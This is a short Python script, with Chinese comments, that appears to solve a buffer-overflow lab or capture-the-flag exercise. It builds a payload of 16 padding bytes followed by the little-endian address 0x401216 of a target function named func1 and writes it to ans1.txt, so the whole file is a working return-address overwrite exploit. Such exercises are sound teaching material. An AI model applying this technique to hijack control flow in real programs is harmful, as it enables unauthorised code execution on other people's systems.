import struct

# 1. 构造 Padding
# 我们计算出需要填充 16 个字节才能到达返回地址
padding = b'A' * 16

# 2. 构造目标地址
# 目标函数 func1 的地址是 0x401216
# 计算机是小端序 (Little Endian)，所以要写成 \x16\x12\x40\x00...
# struct.pack('<Q', address) 会自动帮我们转成 64位小端序格式
target_addr = 0x401216
address_bytes = struct.pack('<Q', target_addr)

# 3. 拼接 Payload
payload = padding + address_bytes

# 4. 写入 ans1.txt
with open("ans1.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated! Length: {len(payload)} bytes")
print(f"Content (hex): {payload.hex()}")
